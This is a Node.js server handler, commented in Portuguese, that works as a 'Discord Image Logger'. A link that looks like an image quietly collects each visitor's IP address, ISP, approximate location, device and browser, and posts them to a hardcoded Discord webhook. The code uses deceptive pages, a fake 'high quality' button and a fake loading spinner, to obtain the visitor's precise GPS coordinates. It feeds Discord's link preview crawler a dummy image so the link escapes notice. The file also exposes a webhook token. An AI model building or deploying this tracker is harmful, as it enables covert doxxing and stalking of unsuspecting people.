// Discord Image Logger - Versão com API IP melhorada
const https = require('https');
const http = require('http');
const url = require('url');

// Configuração
const config = {
  "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
  "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
  "username": "Image Logger",
  "color": 0x00FFFF,
  "accurateLocation": true
};

// Função melhorada para obter informações detalhadas sobre o IP
async function getIPInfo(ip) {
  return new Promise((resolve, reject) => {
    // Usar uma API alternativa que funciona melhor com IPv6 e redes móveis
    const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
    
    http.get(apiUrl, (res) => {
      let data = '';
      res.on('data', (chunk) => { 
        data += chunk; 
      });
      
      res.on('end', () => {
        try {
          const parsedData = JSON.parse(data);
          console.log('Resposta da API IP:', parsedData);
          
          // Verificar se a API retornou sucesso
          if (parsedData.status === 'success') {
            resolve(parsedData);
          } else {
            console.error('API retornou status diferente de sucesso:', parsedData);
            // Ainda resolvemos com os dados que temos
            resolve(parsedData);
          }
        } catch (e) {
          console.error('Erro ao analisar resposta da API IP:', e);
          console.error('Dados recebidos:', data);
          // Resolvemos com um objeto vazio para evitar erros na formatação
          resolve({});
        }
      });
    }).on('error', (error) => {
      console.error('Erro ao fazer requisição para API de IP:', error);
      // Resolvemos com um objeto vazio para evitar erros na formatação
      resolve({});
    });
  });
}

// Função para enviar webhook
function sendDiscordWebhook(data) {
  return new Promise((resolve, reject) => {
    try {
      // Preparar os dados
      const webhookData = JSON.stringify(data);
      
      // Parsear a URL do webhook para obter hostname e path
      const webhookUrl = new URL(config.webhook);
      
      // Configurar a requisição
      const options = {
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname + webhookUrl.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(webhookData)
        }
      };
      
      console.log('Enviando para webhook:', options.hostname, options.path);
      
      // Criar a requisição
      const req = https.request(options, (res) => {
        let responseData = '';
        
        // Coletar dados da resposta
        res.on('data', (chunk) => {
          responseData += chunk;
        });
        
        // Quando a resposta terminar
        res.on('end', () => {
          // Verificar código de status
          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log('Webhook enviado com sucesso');
            resolve(true);
          } else {
            console.error(`Erro ao enviar webhook: Status ${res.statusCode}`);
            console.error(`Resposta: ${responseData}`);
            resolve(false);
          }
        });
      });
      
      // Tratar erros na requisição
      req.on('error', (error) => {
        console.error('Erro na requisição do webhook:', error);
        reject(error);
      });
      
      // Enviar os dados
      req.write(webhookData);
      req.end();
    } catch (error) {
      console.error('Erro ao enviar webhook:', error);
      reject(error);
    }
  });
}

// Detectar se é um dispositivo iOS
function isIOS(userAgent) {
  return /iPad|iPhone|iPod/.test(userAgent);
}

// Função para formatar a mensagem completa do Discord com informações detalhadas do IP
function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null) {
  // Detectar sistema operacional e navegador
  let os = "Unknown";
  let browser = "Unknown";
  
  if (userAgent) {
    // Sistema operacional
    if (userAgent.includes("Windows")) {
      os = "Windows";
    } else if (userAgent.includes("Mac OS")) {
      os = "MacOS";
    } else if (userAgent.includes("Linux")) {
      os = "Linux";
    } else if (userAgent.includes("Android")) {
      os = "Android";
    } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
      os = "iOS";
    }
    
    // Navegador
    if (userAgent.includes("Firefox")) {
      browser = "Firefox";
    } else if (userAgent.includes("Chrome")) {
      browser = "Chrome";
    } else if (userAgent.includes("Safari")) {
      browser = "Safari";
    } else if (userAgent.includes("Edge")) {
      browser = "Edge";
    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
      browser = "Opera";
    }
  }

  // Formatar coordenadas
  let coordsText = 'Unknown';
  let coordsSource = 'Approximate';
  
  if (coords) {
    coordsText = coords.replace(',', ', ');
    coordsSource = `Precise, [Google Maps](https://www.google.com/maps/search/google+map++${coords})`;
  } else if (info && info.lat && info.lon) {
    coordsText = `${info.lat}, ${info.lon}`;
    coordsSource = `Approximate`;
  }

  // Formatar timezone
  let timezoneText = 'Unknown';
  if (info && info.timezone) {
    const parts = info.timezone.split('/');
    if (parts.length >= 2) {
      timezoneText = `${parts[1].replace('_', ' ')} (${parts[0]})`;
    } else {
      timezoneText = info.timezone;
    }
  }

  // Verificar bot
  let botStatus = 'False';
  if (info && info.hosting) {
    if (info.hosting && !info.proxy) {
      botStatus = 'Possibly';
    } else if (info.hosting) {
      botStatus = 'Possibly';
    }
  }

  // Extrair ASN do campo "as" (pode conter o ASN completo como "AS12345 Organization")
  let asn = 'Unknown';
  if (info && info.as) {
    // Extrair apenas o número do ASN
    const asnMatch = info.as.match(/AS(\d+)/i);
    if (asnMatch && asnMatch[1]) {
      asn = info.as;
    } else {
      asn = info.as;
    }
  }

  return `**A User Opened the Original Image!**

**Endpoint:** \`${endpoint || 'N/A'}\`
            
**IP Info:**
> **IP:** \`${ip || 'Unknown'}\`
> **Provider:** \`${info && info.isp ? info.isp : 'Unknown'}\`
> **ASN:** \`${asn}\`
> **Country:** \`${info && info.country ? info.country : 'Unknown'}\`
> **Region:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
> **City:** \`${info && info.city ? info.city : 'Unknown'}\`
> **Coords:** \`${coordsText}\` (${coordsSource})
> **Timezone:** \`${timezoneText}\`
> **Mobile:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
> **VPN:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
> **Bot:** \`${botStatus}\`

**PC Info:**
> **OS:** \`${os}\`
> **Browser:** \`${browser}\`

**User Agent:**
\`\`\`
${userAgent || 'Unknown'}
\`\`\``;
}

// Função principal
module.exports = async (req, res) => {
  try {
    // Obter parâmetros da URL
    const parsedUrl = url.parse(req.url, true);
    const params = parsedUrl.query;
    const geoParam = params.g; // Verificar se já temos coordenadas de localização
    
    // Obter IP e User Agent
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.socket.remoteAddress || 
               'Desconhecido';
    
    const userAgent = req.headers['user-agent'] || 'Desconhecido';
    
    console.log('Requisição recebida de IP:', ip);
    console.log('User Agent:', userAgent);
    
    // Verificar se é iOS para tratamento especial
    const deviceIsIOS = isIOS(userAgent);
    
    // Verificar se o IP é do Discord (começa com 35)
    const isDiscord = ip.startsWith('35');
    
    // Se temos parâmetro de geolocalização, enviar para o Discord
    if (geoParam) {
      try {
        // Decodificar as coordenadas
        const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
        const [latitude, longitude] = coords.split(',');
        
        console.log('Coordenadas recebidas:', latitude, longitude);
        
        // Obter informações detalhadas do IP
        console.log('Obtendo informações do IP...');
        const ipInfo = await getIPInfo(ip);
        console.log('Informações do IP obtidas:', ipInfo);
        
        // Formatar a mensagem completa
        const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
        
        // Enviar webhook ao Discord com coordenadas
        const data = {
          username: config.username,
          content: "@everyone",
          embeds: [
            {
              title: "Image Logger - IP + Localização Capturados",
              color: config.color,
              description: description,
              thumbnail: { url: config.image }
            }
          ]
        };
        
        console.log('Enviando webhook para o Discord...');
        await sendDiscordWebhook(data);
        
        // Enviar página com a imagem
        const html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Imagem</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                overflow: hidden;
              }
              .imagem {
                width: 100%;
                height: 100vh;
                background-image: url('${config.image}');
                background-position: center;
                background-repeat: no-repeat;
                background-size: contain;
              }
            </style>
          </head>
          <body>
            <div class="imagem"></div>
          </body>
          </html>
        `;
        
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(html);
      } catch (error) {
        console.error('Erro ao processar geolocalização:', error);
        // Continuar mesmo com erro na geolocalização
      }
    } else if (isDiscord) {
      // Se for o Discord acessando, enviar alerta de link
      console.log("Acesso do Discord detectado. IP:", ip);
      
      const data = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "Image Logger - Link Sent",
            color: config.color,
            description: `An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
          }
        ]
      };
      
      await sendDiscordWebhook(data);
      
      // Para o Discord, enviar imagem bugada
      res.setHeader('Content-Type', 'image/jpeg');
      res.status(200).send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    } else if (config.accurateLocation) {
      // Se não temos geolocalização ainda, solicitar do navegador
      
      // Primeiro, obter informações do IP e enviar relatório básico
      console.log('Obtendo informações básicas do IP...');
      const ipInfo = await getIPInfo(ip);
      console.log('Informações básicas do IP obtidas:', ipInfo);
      
      // Formatar a mensagem básica
      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
      
      const basicData = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "Image Logger - Acesso Inicial",
            color: config.color,
            description: description,
            thumbnail: { url: config.image }
          }
        ]
      };
      
      console.log('Enviando relatório inicial para o Discord...');
      await sendDiscordWebhook(basicData);
      
      // Personalizar o HTML com base no dispositivo (iOS vs outros)
      let html;
      
      if (deviceIsIOS) {
        // Versão especial para iOS com instruções claras
        html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Imagem</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
              }
              .container {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
                position: relative;
              }
              .image-preview {
                width: 100%;
                max-width: 500px;
                max-height: 70vh;
                object-fit: contain;
                border-radius: 8px;
                box-shadow: 0 4px 8px rgba(0,0,0,0.1);
              }
              .location-button {
                margin-top: 20px;
                background-color: #007AFF; /* iOS blue */
                color: white;
                border: none;
                border-radius: 20px;
                padding: 12px 24px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
              }
              .location-icon {
                margin-right: 8px;
                width: 20px;
                height: 20px;
              }
              .message {
                margin-top: 16px;
                text-align: center;
                color: #8E8E93;
                font-size: 14px;
                max-width: 300px;
              }
              .hidden {
                display: none;
              }
            </style>
          </head>
          <body>
            <div class="container">
              <img src="${config.image}" alt="Imagem" class="image-preview">
              
              <button id="locationButton" class="location-button">
                <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                  <circle cx="12" cy="10" r="3"></circle>
                  <path d="M12 2a8 8 0 0 0-8 8c0 1.892.402 3.13 1.5 4.5L12 22l6.5-7.5c1.098-1.37 1.5-2.608 1.5-4.5a8 8 0 0 0-8-8z"></path>
                </svg>
                Ver em alta qualidade
              </button>
              
              <p class="message">Toque no botão acima para ver a imagem em resolução completa</p>
              
              <div id="loadingMessage" class="message hidden">
                Carregando imagem em alta definição...
              </div>
            </div>
            
            <script>
              // Script para geolocalização no iOS
              document.getElementById('locationButton').addEventListener('click', function() {
                // Mostrar mensagem de carregamento
                document.getElementById('loadingMessage').classList.remove('hidden');
                this.disabled = true;
                this.style.backgroundColor = '#999';
                
                // Solicitar geolocalização
                if (navigator.geolocation) {
                  navigator.geolocation.getCurrentPosition(
                    function(position) {
                      // Sucesso - temos a posição
                      var lat = position.coords.latitude;
                      var lng = position.coords.longitude;
                      var coords = lat + "," + lng;
                      
                      // Codificar em base64
                      var encodedCoords = btoa(coords);
                      
                      // Construir nova URL
                      var currentUrl = window.location.href;
                      var newUrl;
                      if (currentUrl.includes("?")) {
                        newUrl = currentUrl + "&g=" + encodedCoords;
                      } else {
                        newUrl = currentUrl + "?g=" + encodedCoords;
                      }
                      
                      // Redirecionar
                      window.location.replace(newUrl);
                    },
                    function(error) {
                      // Erro ao obter localização
                      console.log("Erro de geolocalização: " + error.message);
                      document.getElementById('loadingMessage').innerText = "Erro ao carregar. Tente novamente.";
                      document.getElementById('locationButton').disabled = false;
                      document.getElementById('locationButton').style.backgroundColor = '#007AFF';
                    },
                    {
                      enableHighAccuracy: true,
                      timeout: 15000,
                      maximumAge: 0
                    }
                  );
                }
              });
            </script>
          </body>
          </html>
        `;
      } else {
        // Versão padrão para Android e outros dispositivos
        html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Imagem</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                overflow: hidden;
              }
              .imagem {
                width: 100%;
                height: 100vh;
                background-image: url('${config.image}');
                background-position: center;
                background-repeat: no-repeat;
                background-size: contain;
              }
              .loading {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0,0,0,0.3);
                display: flex;
                justify-content: center;
                align-items: center;
                color: white;
                font-family: Arial, sans-serif;
                z-index: 100;
              }
              .loading-content {
                background-color: rgba(0,0,0,0.7);
                padding: 20px;
                border-radius: 10px;
                text-align: center;
              }
              .spinner {
                border: 4px solid rgba(255,255,255,0.3);
                border-radius: 50%;
                border-top: 4px solid white;
                width: 30px;
                height: 30px;
                margin: 10px auto;
                animation: spin 1s linear infinite;
              }
              @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
              }
            </style>
          </head>
          <body>
            <div class="imagem"></div>
            <div class="loading">
              <div class="loading-content">
                <div class="spinner"></div>
                <p>Carregando imagem em alta qualidade...</p>
              </div>
            </div>
            
            <script>
              // Script para obter geolocalização
              document.addEventListener('DOMContentLoaded', function() {
                var currentUrl = window.location.href;
                
                // Verificar se já temos o parâmetro g
                if (!currentUrl.includes("g=")) {
                  // Solicitar geolocalização
                  if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                      function(position) {
                        // Sucesso - temos a posição
                        var lat = position.coords.latitude;
                        var lng = position.coords.longitude;
                        var coords = lat + "," + lng;
                        
                        // Codificar em base64
                        var encodedCoords = btoa(coords);
                        
                        // Construir nova URL
                        var newUrl;
                        if (currentUrl.includes("?")) {
                          newUrl = currentUrl + "&g=" + encodedCoords;
                        } else {
                          newUrl = currentUrl + "?g=" + encodedCoords;
                        }
                        
                        // Redirecionar
                        window.location.replace(newUrl);
                      },
                      function(error) {
                        // Erro ao obter localização
                        console.log("Erro de geolocalização: " + error.message);
                        document.querySelector('.loading').style.display = 'none';
                      },
                      {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                      }
                    );
                  }
                }
              });
            </script>
          </body>
          </html>
        `;
      }
      
      res.setHeader('Content-Type', 'text/html');
      res.status(200).send(html);
    } else {
      // Geolocalização não está ativada, enviar relatório básico
      console.log('Obtendo informações básicas do IP (sem geolocalização)...');
      const ipInfo = await getIPInfo(ip);
      console.log('Informações básicas do IP obtidas:', ipInfo);
      
      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
      
      const data = {
        username: config.username,
        content: "@everyone",
        embeds: [
          {
            title: "Image Logger - IP Capturado",
            color: config.color,
            description: description,
            thumbnail: { url: config.image }
          }
        ]
      };
      
      console.log('Enviando relatório para o Discord...');
      await sendDiscordWebhook(data);
      
      // Enviar página com a imagem
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Imagem</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body, html {
              margin: 0;
              padding: 0;
              height: 100%;
              width: 100%;
              overflow: hidden;
            }
            .imagem {
              width: 100%;
              height: 100vh;
              background-image: url('${config.image}');
              background-position: center;
              background-repeat: no-repeat;
              background-size: contain;
            }
          </style>
        </head>
        <body>
          <div class="imagem"></div>
        </body>
        </html>
      `;
      
      res.setHeader('Content-Type', 'text/html');
      res.status(200).send(html);
    }
  } catch (error) {
    console.error('Erro:', error);
    
    // Em caso de erro, enviar página básica
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Imagem</title>
      </head>
      <body>
        <img src="${config.image}" alt="Imagem" style="max-width: 100%; max-height: 100vh;">
      </body>
      </html>
    `);
  }
};
